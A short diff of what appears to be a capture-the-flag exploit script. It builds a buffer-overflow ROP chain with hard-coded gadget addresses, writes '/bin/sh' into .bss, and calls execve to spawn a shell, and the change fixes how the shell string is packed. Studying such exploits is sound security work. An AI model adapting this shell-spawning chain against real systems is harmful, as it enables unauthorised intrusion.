@@ -12,7 +12,7 @@ syscall = 0x00000000004012d3
 mov_rdi_rsi = 0x000000000044d86f 		# mov qword ptr [rdi], rsi ; ret
 
 bss = 0x00000000004c2220
-shell = b"/bin//sh"
+shell = b"/bin/sh\x00"
 
 # payload = cyclic(200)
 payload = b'A'*cyclic_find('saaa')
@@ -21,7 +21,7 @@ payload = b'A'*cyclic_find('saaa')
 payload += p64(pop_rdi)
 payload += p64(bss)
 payload += p64(pop_rsi)
-payload += p64(u64(shell))
+payload += shell
 payload += p64(mov_rdi_rsi)
 
 # call execve("/bin/sh",0,0)
